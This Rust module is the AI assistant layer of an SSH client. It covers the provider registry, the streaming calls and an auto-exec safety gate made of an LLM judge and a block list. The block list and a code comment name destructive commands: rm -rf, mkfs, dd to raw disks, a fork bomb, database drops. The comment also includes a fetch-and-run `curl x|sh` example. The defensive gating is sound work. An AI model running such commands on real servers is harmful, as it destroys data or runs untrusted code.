//! The AI assistant: providers, the request / response types, and the
//! streaming call.
//!
//! Split three ways, because a provider quirk and a risk heuristic have
//! nothing to say to each other:
//!
//! - this file: the provider registry, the message types, the stream.
//! - [`judge`]: the auto-exec judge prompt, and the local risk checks
//!   that run before it.
//! - [`wire`]: our messages in each provider's payload shape.

mod judge;
mod wire;

// Both submodules are internal: nothing outside `ai` calls a payload
// builder or a risk heuristic directly, they are reached through the
// stream entry points and the judge below.
use wire::{stream_anthropic, stream_gemini, stream_openai_at};

use futures_util::StreamExt;
use serde::{Deserialize, Serialize};
use tokio::sync::mpsc;
use tokio_stream::wrappers::UnboundedReceiverStream;


pub const DEFAULT_SYSTEM_PROMPT: &str = "You are a terminal assistant embedded in the Oryxis SSH client, with live access to the user's active SSH session through the `execute_command` tool. Whenever something needs to run on the server, including checking, verifying, or inspecting state, you MUST call `execute_command` to run it yourself. You have direct terminal access: never tell the user to run a command themselves, never put a command in a fenced code block expecting them to run it, and never end your turn by only announcing that you are about to check or run something, call the tool in the same turn. Run only ONE command per turn: after each command runs you receive its output and can decide the next step, so do not try to batch multiple commands into a single response. Only reply in plain text without calling the tool when the user explicitly asks how a command works, what something means, or for an explanation rather than an action. Classify each command's `risk` correctly (`safe` = read-only / introspection; `risky` = writes, deletes, or changes state) so the user is prompted before destructive ones. You also receive the last lines of terminal output for context.";

/// Appended to the assistant reply when the provider stopped because it hit
/// the output token cap, so a cut-off answer doesn't read as complete.
const TRUNCATION_NOTE: &str = "\n\n_[response truncated: hit the model's output length limit]_";

#[derive(Debug, Clone)]
pub struct AiConfig {
    pub provider: String,   // see PROVIDERS ids below
    pub model: String,
    pub api_key: String,
    pub api_url: Option<String>,
    pub system_prompt: Option<String>, // additional system instructions
    /// Let reasoning models think before answering. `false` (the default)
    /// asks the providers that support it to skip thinking; see
    /// [`disable_thinking_field`] for which ones can be told and why the
    /// rest are left alone.
    pub reasoning: bool,
}

// ---------------------------------------------------------------------------
// Provider registry
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProviderKind {
    Anthropic,
    Gemini,
    OpenAiCompat,
    Custom,
}

pub struct ProviderInfo {
    pub id: &'static str,
    pub display: &'static str,
    pub default_url: &'static str,
    pub default_model: &'static str,
    pub kind: ProviderKind,
}

// Ordered list used to populate the provider picker. Anthropic / OpenAI /
// Gemini have dedicated codepaths; everything else is OpenAI-compat and
// reuses `send_openai` with a different base URL.
pub const PROVIDERS: &[ProviderInfo] = &[
    ProviderInfo {
        id: "anthropic",
        display: "Anthropic",
        default_url: "https://api.anthropic.com/v1/messages",
        default_model: "claude-sonnet-5",
        kind: ProviderKind::Anthropic,
    },
    ProviderInfo {
        id: "openai",
        display: "OpenAI",
        default_url: "https://api.openai.com/v1/chat/completions",
        default_model: "gpt-4o",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "gemini",
        display: "Google Gemini",
        default_url: "",
        default_model: "gemini-2.5-flash",
        kind: ProviderKind::Gemini,
    },
    ProviderInfo {
        id: "openrouter",
        display: "OpenRouter",
        default_url: "https://openrouter.ai/api/v1/chat/completions",
        default_model: "anthropic/claude-3.5-sonnet",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "groq",
        display: "Groq",
        default_url: "https://api.groq.com/openai/v1/chat/completions",
        default_model: "llama-3.3-70b-versatile",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "together",
        display: "Together",
        default_url: "https://api.together.xyz/v1/chat/completions",
        default_model: "meta-llama/Llama-3.3-70B-Instruct-Turbo",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "deepseek",
        display: "DeepSeek",
        default_url: "https://api.deepseek.com/v1/chat/completions",
        default_model: "deepseek-chat",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "xai",
        display: "xAI Grok",
        default_url: "https://api.x.ai/v1/chat/completions",
        default_model: "grok-4",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "mistral",
        display: "Mistral",
        default_url: "https://api.mistral.ai/v1/chat/completions",
        default_model: "mistral-large-latest",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "perplexity",
        display: "Perplexity",
        default_url: "https://api.perplexity.ai/chat/completions",
        default_model: "sonar-pro",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "fireworks",
        display: "Fireworks",
        default_url: "https://api.fireworks.ai/inference/v1/chat/completions",
        default_model: "accounts/fireworks/models/llama-v3p3-70b-instruct",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "cerebras",
        display: "Cerebras",
        default_url: "https://api.cerebras.ai/v1/chat/completions",
        default_model: "llama-3.3-70b",
        kind: ProviderKind::OpenAiCompat,
    },
    ProviderInfo {
        id: "custom",
        display: "Custom",
        default_url: "",
        default_model: "",
        kind: ProviderKind::Custom,
    },
];

pub fn provider_info(id: &str) -> &'static ProviderInfo {
    PROVIDERS
        .iter()
        .find(|p| p.id == id)
        .unwrap_or(&PROVIDERS[0])
}

pub fn provider_from_display(display: &str) -> Option<&'static ProviderInfo> {
    PROVIDERS.iter().find(|p| p.display == display)
}

/// HTTP client for streaming provider calls. A connect timeout so a dead host
/// fails fast instead of hanging the chat, and a read (inactivity) timeout so
/// a mid-stream stall doesn't spin `chat_loading` forever, without the
/// total-request timeout that would cut off a long but still-active stream.
fn stream_http_client() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .connect_timeout(std::time::Duration::from_secs(10))
        .read_timeout(std::time::Duration::from_secs(120))
        .build()
        .map_err(http_client_error)
}

/// A client that will not build is a machine with no CA bundle (the OS
/// trust store is read when the client is built), which used to fall
/// back to `reqwest::Client::new()` and panic on the same failure. The
/// chat shows this text in its error bubble, with the fix in it.
fn http_client_error(e: reqwest::Error) -> String {
    format!(
        "HTTPS client could not be built: {e}. Certificates are verified against \
         the operating system's trust store; install the ca-certificates package \
         or point SSL_CERT_FILE at a CA bundle"
    )
}

/// HTTP client for the non-streaming auto-exec judge. A short total timeout is
/// fine here (one small completion) and desirable: the judge fails safe to
/// BLOCK, so a hung request must not stall the whole tool pipeline.
fn judge_http_client() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .connect_timeout(std::time::Duration::from_secs(10))
        .timeout(std::time::Duration::from_secs(60))
        .build()
        .map_err(http_client_error)
}

/// The OpenAI Chat Completions API rejects `max_tokens` on its reasoning
/// models (o-series, gpt-5.x) and wants `max_completion_tokens`, which every
/// current OpenAI chat model accepts. Third-party OpenAI-compatible endpoints
/// still expect `max_tokens`, so key the field name off the official host.
fn openai_max_tokens_field(url: &str) -> &'static str {
    if url.contains("api.openai.com") {
        "max_completion_tokens"
    } else {
        "max_tokens"
    }
}

/// One turn in a conversation, in a provider-agnostic shape. The three
/// `stream_*` functions translate this into each provider's native message
/// format (Anthropic content blocks, OpenAI `tool_calls` + `role:"tool"`,
/// Gemini `functionCall`/`functionResponse`). A plain turn carries just
/// `role` + `content` (text). A tool turn additionally carries `tool_use`
/// (an assistant turn that calls the bash tool) or `tool_result` (the turn
/// that reports its output); `id` pairs the two.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ChatMsg {
    pub role: String, // "user" | "assistant" | "tool"
    #[serde(default)]
    pub content: serde_json::Value, // text string; "" for a pure tool_use turn
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub tool_use: Option<ToolUseMsg>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub tool_result: Option<ToolResultMsg>,
    /// Chain-of-thought the model emitted alongside this assistant turn,
    /// when the provider exposes one (DeepSeek's thinking mode streams it
    /// as `delta.reasoning_content`).
    ///
    /// This is not decoration: DeepSeek REQUIRES it back in the messages
    /// array on every later request of the same conversation, and answers
    /// `400 "The reasoning_content in the thinking mode must be passed
    /// back to the API."` when it is missing. OpenAI-compatible clients
    /// normally drop unknown response fields while rebuilding history,
    /// which is exactly how the second turn of a `deepseek-v4-*` chat used
    /// to fail (issue #105). Only the OpenAI-shaped path replays it;
    /// Anthropic and Gemini have no such field and ignore it.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub reasoning: Option<String>,
}

/// A bash-tool invocation carried on an assistant turn.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ToolUseMsg {
    pub id: String,
    pub command: String,
    pub risk: String,
    /// Gemini's opaque `thoughtSignature`, the sibling key of the
    /// `functionCall` part that produced this call.
    ///
    /// Same class of requirement as [`ChatMsg::reasoning`], but keyed to the
    /// tool call rather than the turn: Gemini 2.5+ thinking models sign each
    /// function call, and the signature must be echoed back verbatim on the
    /// next request or the API answers `400 "Function call is missing a
    /// thought_signature in functionCall parts"`. We rebuild the call from
    /// its name and args, so without this field the signature was dropped on
    /// every replay. Opaque by design: never parse it, never synthesise one.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub thought_signature: Option<String>,
}

/// The output of a prior [`ToolUseMsg`], carried on a `tool` turn.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ToolResultMsg {
    pub id: String,
    pub output: String,
}

impl ChatMsg {
    /// A plain text turn (no tool blocks).
    pub fn text(role: impl Into<String>, content: impl Into<String>) -> Self {
        Self {
            role: role.into(),
            content: serde_json::Value::String(content.into()),
            tool_use: None,
            tool_result: None,
            reasoning: None,
        }
    }

    /// A `tool` turn reporting the result of a prior tool call.
    pub fn tool_result(result: ToolResultMsg) -> Self {
        Self {
            role: "tool".into(),
            content: serde_json::Value::String(String::new()),
            tool_use: None,
            tool_result: Some(result),
            reasoning: None,
        }
    }

    /// The turn's text content, or `""` when it carries none.
    fn text_content(&self) -> &str {
        self.content.as_str().unwrap_or("")
    }
}

/// The bash execution tool definition (Anthropic format).
fn bash_tool() -> serde_json::Value {
    serde_json::json!({
        "name": "execute_command",
        "description": "Execute a bash command in the connected terminal session. The command will be typed into the terminal and executed. Returns the output. You MUST classify the command's `risk` correctly so the user only gets prompted on potentially destructive ones.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The bash command to execute"
                },
                "risk": {
                    "type": "string",
                    "enum": ["safe", "risky"],
                    "description": "Classify the command. `safe` = read-only / introspection (ls, cat, df, du, ps, top, uname, which, grep, find without -delete, head/tail, stat, free, uptime, id, whoami, env, pwd, history). `risky` = anything that writes, deletes, modifies state, escalates privileges, hits the network with side effects, restarts services, edits configs, or runs as root/sudo. When unsure, choose `risky`."
                }
            },
            "required": ["command", "risk"]
        }
    })
}

/// Incremental events produced by `send_chat_stream`. The handler
/// accumulates `Text` deltas into the active assistant bubble and
/// dispatches `ToolUse` (which is only emitted after the model has
/// fully committed to a tool call, partial argument JSON is kept
/// internal to the parser).
#[derive(Debug, Clone)]
pub enum StreamChunk {
    /// Append this slice to the current assistant message.
    Text(String),
    /// Append this slice to the current assistant turn's chain-of-thought
    /// (DeepSeek thinking mode). Kept apart from `Text` because it must not
    /// be rendered as the answer, but must be replayed to the provider:
    /// see [`ChatMsg::reasoning`].
    Reasoning(String),
    /// Model committed to running the bash tool. `command` is the
    /// bash to execute; `risk` is the model's self-classification
    /// (`safe` for read-only / introspection, `risky` for anything
    /// that mutates state). The dispatch handler uses `risk` to
    /// decide whether to auto-execute or surface a confirmation
    /// prompt to the user.
    ToolUse {
        command: String,
        risk: String,
        /// Gemini's per-call `thoughtSignature`, when the provider signed
        /// this call. Carried through so the replay can echo it back; see
        /// [`ToolUseMsg::thought_signature`]. `None` everywhere else.
        thought_signature: Option<String>,
    },
    /// Stream completed cleanly. No more chunks will follow.
    Done,
    /// Provider/network error. User-facing message; stream stops here.
    Error(String),
}

/// Streaming variant of `send_chat`. Returns immediately with a stream
/// the caller can poll; chunks fire as the provider emits them. The
/// stream always ends with either `Done` (success) or `Error` (failure).
pub fn send_chat_stream(
    config: AiConfig,
    messages: Vec<ChatMsg>,
) -> UnboundedReceiverStream<StreamChunk> {
    let (tx, rx) = mpsc::unbounded_channel();
    tokio::spawn(async move {
        let info = provider_info(&config.provider);
        let result = match info.kind {
            ProviderKind::Anthropic => stream_anthropic(&config, &messages, &tx).await,
            ProviderKind::Gemini => stream_gemini(&config, &messages, &tx).await,
            ProviderKind::OpenAiCompat => {
                let url = config
                    .api_url
                    .as_deref()
                    .filter(|s| !s.is_empty())
                    .unwrap_or(info.default_url)
                    .to_string();
                stream_openai_at(&url, &config, &messages, &tx).await
            }
            ProviderKind::Custom => {
                let url = config.api_url.as_deref().unwrap_or("");
                if url.is_empty() {
                    let _ = tx.send(StreamChunk::Error(
                        "Custom provider requires an API URL".into(),
                    ));
                    return;
                }
                stream_openai_at(url, &config, &messages, &tx).await
            }
        };
        let _ = match result {
            Ok(()) => tx.send(StreamChunk::Done),
            Err(e) => tx.send(StreamChunk::Error(e)),
        };
    });
    UnboundedReceiverStream::new(rx)
}

/// System prompt for the independent auto-exec safety gate. The judge
/// never runs the command, it only decides whether running it
/// automatically (with no user confirmation) is acceptable.
pub const AUTO_EXEC_JUDGE_PROMPT: &str = "You are a safety gate placed in front of a terminal assistant. The command below is about to run AUTOMATICALLY on the user's live server, with no confirmation step. Decide whether running it unattended is safe. Answer BLOCK (so the user is asked first) for anything that writes, deletes, moves, renames, overwrites, or truncates files, changes permissions or ownership, installs or removes software, starts/stops/restarts services, edits configuration, has outbound network side effects, escalates privileges, or is otherwise irreversible or state-changing. Answer ALLOW only for clearly read-only / introspection commands (listing, reading, status, versions, resource usage). If you are unsure, answer BLOCK. Reply with a single word: ALLOW or BLOCK.";

/// Independent second-opinion check run before a model-claimed `safe`
/// command is auto-executed without user confirmation. Returns true only
/// when the judge clearly approves. Any ambiguity, an unparseable reply,
/// or a transport error resolves to false (require confirmation), so the
/// gate fails safe: a broken or unreachable judge never opens the
/// auto-exec path, it only ever forces the user prompt.
pub async fn judge_auto_exec(config: AiConfig, command: String) -> bool {
    matches!(judge_auto_exec_inner(&config, &command).await, Ok(true))
}

async fn judge_auto_exec_inner(config: &AiConfig, command: &str) -> Result<bool, String> {
    let client = judge_http_client()?;
    let info = provider_info(&config.provider);
    let user_msg = format!("Command about to auto-run:\n`{command}`\n\nALLOW or BLOCK?");

    // Pull the model's verdict text out of a single non-streaming
    // completion. Each provider family has its own request/response
    // shape, mirroring the streaming functions above but without tools.
    let text = match info.kind {
        ProviderKind::Anthropic => {
            let body = serde_json::json!({
                "model": config.model,
                // Headroom for a reasoning model to think before the
                // one-word verdict; an instruct model still stops early.
                "max_tokens": 512,
                "system": AUTO_EXEC_JUDGE_PROMPT,
                "messages": [{ "role": "user", "content": user_msg }],
            });
            let url = config
                .api_url
                .as_deref()
                .filter(|s| !s.is_empty())
                .unwrap_or("https://api.anthropic.com/v1/messages");
            let resp = client
                .post(url)
                .header("x-api-key", &config.api_key)
                .header("anthropic-version", "2023-06-01")
                .header("content-type", "application/json")
                .json(&body)
                .send()
                .await
                .map_err(|e| format!("judge request failed: {e}"))?;
            if !resp.status().is_success() {
                return Err(format!("judge API error {}", resp.status()));
            }
            let v: serde_json::Value =
                resp.json().await.map_err(|e| format!("judge parse: {e}"))?;
            v["content"]
                .as_array()
                .and_then(|a| a.iter().find_map(|b| b["text"].as_str()))
                .unwrap_or("")
                .to_string()
        }
        ProviderKind::Gemini => {
            let body = serde_json::json!({
                "contents": [{ "role": "user", "parts": [{ "text": user_msg }] }],
                "systemInstruction": { "parts": [{ "text": AUTO_EXEC_JUDGE_PROMPT }] },
            });
            // The judge needs the non-streaming generateContent endpoint;
            // a custom URL configured for streaming gets swapped over.
            let url = match config.api_url.as_deref() {
                Some(u) if !u.is_empty() => format!(
                    "{}?key={}",
                    u.replace("streamGenerateContent", "generateContent"),
                    config.api_key
                ),
                _ => format!(
                    "https://generativelanguage.googleapis.com/v1beta/models/{}:generateContent?key={}",
                    config.model, config.api_key
                ),
            };
            let resp = client
                .post(&url)
                .header("content-type", "application/json")
                .json(&body)
                .send()
                .await
                .map_err(|e| format!("judge request failed: {e}"))?;
            if !resp.status().is_success() {
                return Err(format!("judge API error {}", resp.status()));
            }
            let v: serde_json::Value =
                resp.json().await.map_err(|e| format!("judge parse: {e}"))?;
            v["candidates"]
                .as_array()
                .and_then(|a| a.first())
                .and_then(|c| c["content"]["parts"].as_array())
                .and_then(|p| p.iter().find_map(|part| part["text"].as_str()))
                .unwrap_or("")
                .to_string()
        }
        ProviderKind::OpenAiCompat | ProviderKind::Custom => {
            let url = config
                .api_url
                .as_deref()
                .filter(|s| !s.is_empty())
                .unwrap_or(info.default_url);
            if url.is_empty() {
                return Err("judge: provider requires an API URL".into());
            }
            let mut body = serde_json::json!({
                "model": config.model,
                "messages": [
                    { "role": "system", "content": AUTO_EXEC_JUDGE_PROMPT },
                    { "role": "user", "content": user_msg },
                ],
            });
            // Headroom for a reasoning model to think before the one-word
            // verdict; an instruct model still stops early. Field name depends
            // on the host (OpenAI reasoning models reject `max_tokens`).
            body[openai_max_tokens_field(url)] = serde_json::json!(512);
            let resp = client
                .post(url)
                .header("Authorization", format!("Bearer {}", config.api_key))
                .header("content-type", "application/json")
                .json(&body)
                .send()
                .await
                .map_err(|e| format!("judge request failed: {e}"))?;
            if !resp.status().is_success() {
                return Err(format!("judge API error {}", resp.status()));
            }
            let v: serde_json::Value =
                resp.json().await.map_err(|e| format!("judge parse: {e}"))?;
            v["choices"]
                .as_array()
                .and_then(|a| a.first())
                .and_then(|c| c["message"]["content"].as_str())
                .unwrap_or("")
                .to_string()
        }
    };

    // Fail safe: open auto-exec only when the verdict ends on ALLOW.
    // Take the LAST of the two tokens so a reasoning model that mentions
    // both while thinking ("could BLOCK, but ALLOW") is read by its final
    // word. Empty / neither-token / BLOCK-last replies all stay blocked.
    let upper = text.to_uppercase();
    let allow_at = upper.rfind("ALLOW");
    let block_at = upper.rfind("BLOCK");
    Ok(match (allow_at, block_at) {
        (Some(a), Some(b)) => a > b,
        (Some(_), None) => true,
        _ => false,
    })
}

/// Deterministic floor under the LLM judge: commands we already know are
/// catastrophic or irreversible and must never auto-run unattended, no
/// matter how the model classified them. A match forces the confirmation
/// prompt; like the judge it can only escalate, never approve. Runs
/// first, so these are caught even if the judge is wrong, jailbroken by
/// the command text, or unreachable, and without spending a judge call.
///
/// Intentionally high-precision (catastrophic / host-level only); the
/// nuanced, app-level destructive cases are left to the judge so this
/// list stays short and false positives stay rare.
pub fn is_obviously_destructive(command: &str) -> bool {
    let c = command.to_ascii_lowercase();
    // Shell-separator tokenization for command-name checks.
    let tokens: Vec<&str> = c
        .split(|ch: char| ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')'))
        .filter(|t| !t.is_empty())
        .collect();

    // Host-killers: bring the machine down.
    if tokens
        .iter()
        .any(|t| matches!(*t, "reboot" | "shutdown" | "poweroff" | "halt"))
    {
        return true;
    }
    // `rm` with both a recursive and a force flag, in any order / form.
    if c.contains("rm ") {
        let recursive = c.contains(" -r")
            || c.contains("--recursive")
            || c.contains(" -rf")
            || c.contains(" -fr");
        let force = c.contains(" -f")
            || c.contains("--force")
            || c.contains(" -rf")
            || c.contains(" -fr");
        if recursive && force {
            return true;
        }
    }
    // Disabling rm's root guard is never something to auto-run.
    if c.contains("--no-preserve-root") {
        return true;
    }
    // Filesystem / partition destroyers (incl. mkfs.ext4-style subforms).
    if tokens
        .iter()
        .any(|t| matches!(*t, "wipefs" | "fdisk" | "parted" | "mkswap" | "shred") || t.starts_with("mkfs"))
    {
        return true;
    }
    // dd writing straight to a raw device, or a redirect overwriting one.
    if c.contains("dd ") && c.contains("of=/dev/") {
        return true;
    }
    if ["> /dev/sd", "> /dev/nvme", "> /dev/disk", "> /dev/vd"]
        .iter()
        .any(|p| c.contains(p))
    {
        return true;
    }
    // Classic fork bomb.
    if c.contains(":(){") || c.contains(":|:&") {
        return true;
    }
    // Irreversible database drops.
    if c.contains("drop database") || c.contains("drop table") || c.contains("truncate table") {
        return true;
    }
    false
}

/// True when a command is more than a single simple command: it contains
/// shell control operators, a pipeline, a redirection, command
/// substitution, or a newline. The "always run X" allow-list keys on the
/// first whitespace token only, so without this guard a once-trusted name
/// like `ls` would also auto-run `ls; rm -rf ~` or `git status && curl x|sh`.
/// Always on: a chained command never takes the allow-list shortcut, it
/// falls through to the deterministic floor and the judge like any
/// untrusted command (which can only escalate to a confirmation prompt).
pub fn has_shell_chaining(command: &str) -> bool {
    let mut chars = command.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            ';' | '|' | '&' | '<' | '>' | '`' | '\n' | '\r' => return true,
            // Command / arithmetic substitution: `$(...)` or `${...}`.
            '$' if matches!(chars.peek(), Some('(') | Some('{')) => return true,
            _ => {}
        }
    }
    false
}

/// SSE line iterator over a reqwest byte stream. Buffers chunks until a
/// blank line (event boundary), yielding the assembled `data:` payload
/// (concatenated if the event spanned multiple `data:` lines). Discards
/// `event:` / `id:` / comment lines, providers we hit don't put load-
/// bearing info there.
pub(super) async fn for_each_sse_event<S, B, E, F>(
    mut byte_stream: S,
    mut on_event: F,
) -> Result<(), String>
where
    S: futures_util::Stream<Item = Result<B, E>> + Unpin,
    B: AsRef<[u8]>,
    E: std::fmt::Display,
    F: FnMut(&str) -> Result<bool, String>,
{
    let mut buf = String::new();
    let mut data_acc = String::new();
    while let Some(chunk) = byte_stream.next().await {
        let chunk = chunk.map_err(|e| format!("stream read failed: {e}"))?;
        let s = std::str::from_utf8(chunk.as_ref()).map_err(|e| format!("utf8: {e}"))?;
        buf.push_str(s);
        // SSE separates events with a blank line ("\n\n"). Process all
        // complete events in the buffer; keep the trailing partial line
        // for the next chunk.
        while let Some(boundary) = buf.find("\n\n") {
            let event = buf[..boundary].to_string();
            buf.drain(..boundary + 2);
            data_acc.clear();
            for line in event.lines() {
                if let Some(payload) = line.strip_prefix("data:") {
                    if !data_acc.is_empty() {
                        data_acc.push('\n');
                    }
                    data_acc.push_str(payload.trim_start());
                }
            }
            if data_acc.is_empty() {
                continue;
            }
            if on_event(&data_acc)? {
                return Ok(());
            }
        }
    }
    Ok(())
}
